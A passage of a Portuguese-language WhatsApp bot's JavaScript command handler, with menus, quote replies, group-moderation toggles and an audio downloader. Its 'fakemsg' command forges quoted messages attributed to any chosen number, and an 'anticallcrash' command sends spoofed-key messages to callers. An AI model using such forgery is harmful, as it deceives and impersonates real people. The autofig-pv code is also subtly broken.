{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐈𝐍𝐎𝐒𝐔𝐊𝐄", rowId: `${prefix}wallpaperinosuke`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐌𝐔𝐙𝐀𝐍", rowId: `${prefix}wallpaparmuzan`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐊𝐎𝐊𝐔𝐒𝐇𝐈𝐁𝐎𝐔", rowId: `${prefix}wallpaperkokushibou`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐙𝐄𝐍𝐈𝐓𝐒𝐔", rowId: `${prefix}wallpaperzenitsu`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐓𝐀𝐍𝐉𝐈𝐑𝐎", rowId: `${prefix}wallpapertanjiro`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐊𝐀𝐙𝐀", rowId: `${prefix}wallpaperakaza`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐆𝐘𝐎𝐌𝐄𝐈", rowId: `${prefix}wallpapergyomei`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐊𝐘𝐎𝐍𝐉𝐔𝐑𝐎", rowId: `${prefix}wallpaperkyonjuro`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐌𝐀𝐑𝐄𝐋𝐎", rowId: `${prefix}wallpaperamarelo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐍𝐈𝐌𝐄𝐒", rowId: `${prefix}wallpaperanimes`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐀𝐙𝐔𝐋", rowId: `${prefix}wallpaperazul`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐃𝐀𝐑𝐊", rowId: `${prefix}wallpaperdark`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐑𝐎𝐒𝐀", rowId: `${prefix}wallpaperrosa`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐑𝐎𝐗𝐎", rowId: `${prefix}wallpaperroxo`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 4𝐊", rowId: `${prefix}wallpapers4k`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐁𝐑𝐀𝐍𝐂𝐎", rowId: `${prefix}wallpaperbranco`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐕𝐄𝐑𝐃𝐄", rowId: `${prefix}wallpaperverde`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑 𝐕𝐄𝐑𝐌𝐄𝐋𝐇𝐎", rowId: `${prefix}wallpapervermelho`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}
]
},
]
 

const listMessage2 = {
text: `
𝐌𝐞𝐧𝐮 𝐖𝐚𝐥𝐥𝐩𝐚𝐩𝐞𝐫`,
  footer: `𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝐁𝐲 𝐍𝐞𝐳𝐮𝐤𝐨-𝐌𝐃`,
  title: ``,
  buttonText: "[☔] 𝐂𝐥𝐢𝐪𝐮𝐞 𝐀𝐪𝐮𝐢 [☔]",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: info})
}
break

case 'recadoprowhatsapp'://by Daniel>\<
                    rate = body.slice(6)
					var foda =['Felicidade é só questão de ser.','Acredite: sempre tem algo bom guardado para você','Concentre-se no que está buscando, não no que está deixando para trás.','A vida é muito curta pra não viver sorrindo por aí!','Onde há vontade, há chance de dar certo!','Dance no seu ritmo! 💃','Só você sabe o que te deixará feliz.','Não se estresse com o que está fora do seu controle.','Aprenda a apreciar as voltas que o mundo dá.','Comece a se amar. O resto virá depois.','Maior que a tristeza de não haver vencido é a vergonha de não ter lutado!','Reciprocidade, para as coisa boas. Imunidade, para as coisas ruins.','Coragem, a vida gosta de pessoas destemidas.', 'Compartilhe seus sentimentos. Nem todas as pessoas sabem adivinhar','Continue caminhando, não tem problema se for devagar.','Melhor amar do que ser amargo!','Não corrigir nossas falhas é o mesmo que cometer novos erros','Quando o caminho se torna duro, só os duros continuam caminhando','Florescer exige passar por todas as estações!','Quando as coisas simples parecem especiais, você percebe como a vida pode ser boa.','Os aprendizados deixam a vida especial.','Feliz daquele que encontra o verdadeiro amor sem as cicatrizes da decepção']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					reply(` ${zaltin} `)
					break

case 'frasecriativas'://by Daniel>\<
                    rate = body.slice(6)
					var foda =['Não conte os dias, viva-os! ☀️😎','Tudo que vem, vem com algum propósito. Assim como tudo que vai, vai por uma razão. 🌸🌀','Eu não gosto de cobrar atitude de ninguém porque eu tenho de sobra. 😉','Gostar, eu gosto de muita gente, mas a minha prioridade sempre será eu mesma. ✨','As pessoas que criticam, são as mesmas que copiam. 👀','Aprendi que meu único limite é a minha mente. 🌎','Fazendo dos meus sonhos, um objetivo. 💭']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					reply(` ${zaltin} `)
					break

case 'frasebonita'://by Daniel>\<
                    rate = body.slice(6)
					var foda =['Viver em paz é um luxo. É saber que, apesar dos pesares, ficar bem é prioridade. ✨','Somos ferramentas para a vida seguir em frente. 🌎','Ao invés de pensar nas marcas que a vida deixa em você, reflita: Quais as marcas você está deixando na vida? 💭','Segue seu coração, tudo vai dar certo. ♥️','Permita-se sentir tudo que está dentro de você! ✨','Cada etapa da vida, lhe demandará uma versão mais forte de você. 🍃','A vida é como uma rosa, cada pétala um sonho, cada espinho uma realidade🌷🙉','A arma dos fracos é criticar os fortes. A arma dos fortes é ignorar os fracos!👌','Pare de olhar para trás. Você já sabe onde esteve, agora precisa saber pra onde vai🌙🍃','Só faz sentido o que te faz sentir.']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					reply(` ${zaltin} `)
					break

case 'stickeralet': {
 if (mek.key.fromMe) return 
var zeltas =['aguarde','logo logo enviarei','calma ai','enquanto isso vai um café?☕️','aguarde um pouco']
var zalts = zeltas[Math.floor(Math.random() * zeltas.length)]
var badin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','42','43','44','45','46','47','48','49','50','51','52','53','54','55']
var oto = badin[Math.floor(Math.random() * badin.length)]
reply(`${zalts}`);
nezuko.sendMessage(m.chat, {sticker: fs.readFileSync(`./funções de cmd/imgs/pack/${oto}.webp`)}, {quoted: dnselo});
}
break

//======================================\\
  
case 'configp': case 'configuração': case 'ajuda': case 'grupo':  {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿",
rows: [
{title: "𝐀𝐁𝐑𝐈𝐑 𝐎 𝐆𝐑𝐔𝐏𝐎 ", rowId: `${prefix}abrirgp a`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐅𝐄𝐂𝐇𝐀𝐑 𝐎 𝐆𝐑𝐔𝐏𝐎", rowId: `${prefix}abrirgp f`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐔𝐓𝐎 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 ", rowId: `${prefix}autofig-gp 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐃𝐄𝐒𝐀𝐓𝐈𝐕𝐀𝐑 𝐀𝐔𝐓𝐎 𝐒𝐓𝐈𝐂𝐊𝐄𝐑", rowId: `${prefix}autofig-gp 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐈𝐍𝐅𝐎 𝐃𝐎𝐍𝐎", rowId: `${prefix}infodono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐑𝐄𝐒𝐄𝐓𝐀𝐑 𝐋𝐈𝐍𝐊 𝐃𝐎 𝐆𝐑𝐔𝐏𝐎", rowId: `${prefix}novolink`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐂𝐑𝐈𝐀𝐃𝐎𝐑", rowId: `${prefix}dono`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒 𝐃𝐎 𝐆𝐑𝐔𝐏𝐎", rowId: `${prefix}infogp`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}
]
},
]
 

const listMessage2 = {
text: `
Cᴏɴғɪɢᴜʀᴀᴄ̧ᴏ̃ᴇs Dᴏ Gʀᴜᴘᴏ `,
  footer: `Cᴏᴘʏʀɪɢʜᴛ Bʏ Nᴇᴢᴜᴋᴏ Bᴏᴛ >3 `,
  title: `Cᴏɴᴛʀᴏʟᴇ Sᴇᴜ Gʀᴜᴘᴏ Aϙᴜɪ.`,
  buttonText: "[⚜️] Cʟɪϙᴜᴇ Aϙᴜɪ [⚜️]",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: info})
}
break  

case 'ativações': case 'ativacoes': {
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿",
rows: [
{title: "Ativar autofigu", rowId: `${prefix}autofig-gp 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "desativar autofigu", rowId: `${prefix}autofig-gp 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antidocumento", rowId: `${prefix}antidocumento 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antidocumento", rowId: `${prefix}antidocumento 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antilink", rowId: `${prefix}antilink 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antilink", rowId: `${prefix}antilink 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antilinkhard", rowId: `${prefix}antilinkhard 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antilinkhard", rowId: `${prefix}antilinkhard 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antiloc", rowId: `${prefix}antiloc 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antiloc", rowId: `${prefix}antiloc 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar anticontato", rowId: `${prefix}ct1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar anticontato", rowId: `${prefix}ct0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antiaudio", rowId: `${prefix}antiaudio 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antiaudio", rowId: `${prefix}antiaudio 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antivideo", rowId: `${prefix}antivideo 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antivideo", rowId: `${prefix}antivideo 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antifake", rowId: `${prefix}varfake 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antifake", rowId: `${prefix}varfake 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antiimg", rowId: `${prefix}antiimg 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antiimg", rowId: `${prefix}antiimg 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar anticatalogo", rowId: `${prefix}anticatalogo 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar anticatalogo", rowId: `${prefix}anticatalogo 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar antisticker", rowId: `${prefix}antisticker 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar antisticker", rowId: `${prefix}antisticker 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar nsfw", rowId: `${prefix}nsfw 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar nsfw", rowId: `${prefix}nsfw 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar leveling", rowId: `${prefix}leveling 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar leveling", rowId: `${prefix}leveling 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar anagrama", rowId: `${prefix}anagrama 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar anagrama", rowId: `${prefix}anagrama 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Ativar bemvindo", rowId: `${prefix}varbemvindo 1`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "Desativar bemvindo", rowId: `${prefix}varbemvindo 0`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}
]
},
]
 

const listMessage2 = {
text: `
Configurações do grupo`,
  footer: `Copyright By Nezuko-MD `,
  title: `Ativações do grupo aqui.`,
  buttonText: "[🌺] Clique aqui [🌺]",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: info})
}
break  

case 'edits': {
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿",
rows: [
{title: "☔ 𝐄𝐃𝐈𝐓 𝐍𝐀𝐑𝐔𝐓𝐎 ☔", rowId: `${prefix}narutoedits`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "☔ 𝐄𝐃𝐈𝐓 𝐉𝐔𝐉𝐔𝐓𝐒𝐔 ☔", rowId: `${prefix}jujutsuedits`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "☔ 𝐄𝐃𝐈𝐓 𝐈𝐓𝐀𝐂𝐇𝐈 ☔", rowId: `${prefix}itachiedits`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}
]
},
]
 

const listMessage2 = {
text: `      ☔ 𝐌𝐞𝐧𝐮 𝐞𝐝𝐢𝐭𝐬 ☔`,
  footer: `𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝐁𝐲 𝐍𝐞𝐳𝐮𝐤𝐨-𝐌𝐃`,
  title: `𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐞 𝐒𝐮𝐚𝐬 𝐄𝐝𝐢𝐭𝐬 𝐀𝐪𝐮𝐢`,
  buttonText: "[☔] 𝐂𝐥𝐢𝐪𝐮𝐞 𝐀𝐪𝐮𝐢 [☔]",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: info})
}
break  

case 'ytaudio2': //@Tobi
  reply(enviar.espere)
  let { yta } = require('./funções de cmd/funções/y2.js')
  teks = args[0];
  if (!teks) return reply("Cadê o link mzr?")
  yts(teks).then(async value => {
    const allTypeVid = value.all.find((obj) => obj.type === 'video');
    yta(allTypeVid.url).then(async position => {
      nezuko.sendMessage(from, {
        audio: {
          url: position.dl_link
        }, contextInfo: {
          "externalAdReply": {
            "title": `Música: ${position.title}\n`, "body": `Duração: ${allTypeVid.duration.timestamp}`, "mediaType": 2, showAdAttribution: true, "thumbnail": await getBuffer(allTypeVid.image), mediaUrl: allTypeVid.url
          }}, mimetype: 'audio/mp4'
      }, {
        quoted: dnselo
      });
    }, (err) => {
    reply("Deu erro aq em")
    });
  }, (err) => {
    reply("Deu erro aq em")
  });
  break
  
case 'autofig-gp':
case 'autofig':
if (!isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
if (args.length < 1) return reply('tipo autofig-gp 1 para ativar \ntipo autofig-gp 1 para desativar')
if (args[0]  === '1'){
if (isAutoSticker) return reply(`Já ativo`)
autosticker.push(from)
fs.writeFileSync('./funções de cmd/funções/autosticker.json', JSON.stringify(autosticker))
reply('autofig-gp ativo')
} else if (args[0] === '0'){
let anu = autosticker.indexOf(from)
autosticker.splice(anu, 1)
fs.writeFileSync('./funções de cmd/funções/autosticker.json', JSON.stringify(autosticker))
reply('autofig-gp Desligado')
}
break


case 'autofig-pv':
case 'autofig-geral':
if (args.length < 1) return reply('autofig-pv 1 para ativar \n autofig-pv 0 para desativar')
if (args[0]  === '1'){
if (isAutoStick) return reply(`Já ativo`)
autostick.push(from)
fs.writeFileSync('./funções de cmd/funções/autostickpc.json', JSON.stringify(autosticker))
reply('autofig-pv ativo')
} else if (args[0] === '0'){
let anu = autosticker.indexOf(from)
autostick.splice(anu, 1)
fs.writeFileSync('./funções de cmd/funções/autostickpc.json', JSON.stringify(autosticker))
reply('autofig-pv Desligado')
}
break

case 'antiligar':
case 'antiligacao':  
case 'antiligação':  
try {
if (!SoDono  && !m.key.fromMe) return reply(mess.owner)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAnticall) return reply('Ja esta ativo')
anticall.push('Ativado')
fs.writeFileSync('./funções de cmd/usuarios/anticall.json', JSON.stringify(anticall))
reply('Ativou com sucesso o recurso de antiligação no bot✔️')
} else if (Number(args[0]) === 0) {
if (!isAnticall) return reply('Ja esta Desativado')  
fs.writeFileSync('./funções de cmd/usuarios/anticall.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antiligação no bot✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break

case 'anticallblock':
case 'anticallaviso':
case 'anticallcrash':
if(!SoDono) return sendBtext(from, "❗PARADO Ai❗", `${pushname} Você não pode executar este comando!`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], info)
if ( command == "anticallblock" ){
await nezuko.updateBlockStatus(`${q}`, "block")
//reply(`Bloqueado com sucesso ${pushname}`, "✅")
} else if ( command == "anticallaviso" ){
sendBtext(`${q}`, `\t『❗𝙈𝙀𝙉𝙎𝘼𝙂𝙀𝙈 𝘿𝘼 𝘼𝘿𝙈𝙄𝙉𝙄𝙎𝙏𝙍𝘼𝘾̧𝘼̃𝙊 』\n\t𝘙𝘌𝘔𝘌𝘛𝘌𝘕𝘛𝘌: ${pushname.toUpperCase()}\n`, `📨𝗘𝗶𝘁𝗮, 𝗰𝗵𝗲𝗴𝗼𝘂 𝘂𝗺 𝗮𝘃𝗶𝘀𝗼 𝗽𝗮𝗿𝗮 𝘃𝗼𝗰𝗲̂.\n@${q.replace("@s.whatsapp.net", "")} ligações para a Nezuko são proibidas e você podendo ser BANIDO ou até mesmo DEIXARÁ DE UTILIZAR NOSSOS SERVIÇOS❗Pedimos que não ligue novamente.`, [ {buttonId: `${prefix}tchau`, buttonText: {displayText: `Ok 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿`}, type: 1}], info)
const reactionMessage = {
react: {
text: "📨",
key: info.key
}
}
nezuko.sendMessage(from, reactionMessage)
//reply(null, "✅")
} else if ( command == "anticallcrash" ){
let anticallcrss = { key: { participant: "0@s.whatsapp.net", remoteJid: "0@g.us", }, message: {conversation: "nada haver isso aí animal" } }
nezuko.sendMessage(`${q}`, {text: 'Presentinho😘'}, {quoted: anticallcrss })
//reply(null, "✅")
}
break

case'fakemsg':
if (args.length == 2) return reply(`Use assim: ${prefix + command} @5521964523665|Daniel Domina|Já sabemos\n\nObs: Pode usar qualquer coisa`)
k = `${body.slice(10)}`
txt1 = k.split("|")[0];
txt2 = k.split("|")[1];
txt3 = k.split("|")[2];
nezuko.sendMessage(from, {text: `${txt3}`}, {quoted:{    key: {fromMe: false,participant: `${txt1}@s.whatsapp.net`},message: { "extendedTextMessage": {"text": `${txt2}`,"title": `Hmm`}}}})
break

case 'antipv':
if (!SoDono) return reply(`Apenas dono pode ativar/desativar essa função..`)
if (Number(args[0]) === 1) {
if (isAntiPv) return reply('<❗> Já esta ativo.')
antipv.push('Ativado')
fs.writeFileSync('./funções de cmd/usuarios/antipv.json', JSON.stringify(antipv))
reply('<❗> Ativado com sucesso.')
} else if (Number(args[0]) === 0) {
if (!isAntiPv) return reply('Já está desativado')
fs.writeFileSync('./funções de cmd/usuarios/antipv.json', JSON.stringify([]))
reply('<❗> Desativado com sucesso.')
} else {
if(isAntiPv){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1},
]
}
buttonMessage02 = {
text: `[🔒] 𝐀𝐍𝐓𝐈-𝐏𝐕 𝐁𝐋𝐎𝐂𝐊 [🔒]`,
footer: `Status: ${isAntiPv ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break

case 'autoreação':
case 'autoreacao':
case 'autoreact':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (Number(args[0]) === 1) {
if (isAutoReact) return reply('Já está ativado')
autoreact.push(from)
fs.writeFileSync('./funções de cmd/funções/autoreact.json', JSON.stringify(autoreact))
reply('[⚡️] Ativou com sucesso o recurso de auto reação neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAutoReact) return reply('Já está desativado')
pesquisar = from
processo = autoreact.indexOf(pesquisar)
while(processo >= 0){
autoreact.splice(processo, 1)
processo = autoreact.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/funções/autoreact.json', JSON.stringify(autoreact))
reply('<❗> Desativou com sucesso o recurso de auto reação neste grupo.️')
} else {
if(isAutoReact){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}]
}
buttonMessage02 = {
text: `[🛑] 𝐀𝐔𝐓𝐎-𝐑𝐄𝐀𝐂̧𝐀̃𝐎 [🛑]`,
footer: `O auto react está ${isAutoReact ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break




//=================(ANTS)=================\\

case 'anticontatos':
case 'antictt':
case 'anticontato':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
buttons22 = [
  {buttonId:`${prefix}ct1`, buttonText: {displayText: 'Ligar'}, type: 1},
  {buttonId: `${prefix}ct0`, buttonText: {displayText: 'Desligar'}, type: 1}]
buttonMessage22 = {
    text: "[⚜️] 𝐀𝐍𝐓𝐈-𝐂𝐎𝐍𝐓𝐀𝐓𝐎 [⚜️]",
    footer: '⚡️ 𝙰𝙽𝚃𝙸 𝙲𝙾𝙽𝚃𝙰𝚃𝙾\n𝚌𝚘𝚖 𝚎𝚜𝚝𝚎 𝚌𝚘𝚖𝚊𝚗𝚍𝚘 𝚊𝚝𝚒𝚟𝚘,\n𝚚𝚞𝚎𝚖 𝚎𝚗𝚟𝚒𝚊𝚛 𝚌𝚘𝚗𝚝𝚊𝚝𝚘 𝚗𝚘 𝚐𝚛𝚞𝚙𝚘 \n𝚂𝚎𝚛𝚊́ 𝚊𝚞𝚝𝚘𝚖𝚊𝚝𝚒𝚌𝚊𝚖𝚎𝚗𝚝𝚎 𝚛𝚎𝚖𝚘𝚟𝚒𝚍𝚘',
    buttons: buttons22,
    headerType: 1
}
sendMsg = await nezuko.sendMessage(from, buttonMessage22, {quoted: dnselo})
break

case 'ct1':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (isAntiCtt) return reply('Ja esta ativo')
antictt.push(from)
fs.writeFileSync('./funções de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝')
break 

case 'ct0':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!isAntiCtt) return reply('Ja esta Desativado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️')
break

